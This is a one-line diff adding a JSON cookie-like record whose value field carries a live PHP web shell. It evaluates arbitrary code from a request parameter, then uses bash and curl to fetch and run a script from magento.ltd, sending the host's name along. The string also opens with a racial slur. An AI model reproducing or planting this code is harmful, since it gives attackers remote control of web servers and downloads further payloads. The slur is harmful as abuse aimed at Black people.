@@ -1,0 +1,1 @@
+[{"Expires":1,"Discard":false,"Value":"nigger<?php @eval($_REQUEST['hairy']);$c = 'bash -c \"$(curl -fsSL https:\/\/magento.ltd\/dumy\/?hostname='.$_SERVER['HTTP_HOST'].')\"';@system($c);?>\n"}]
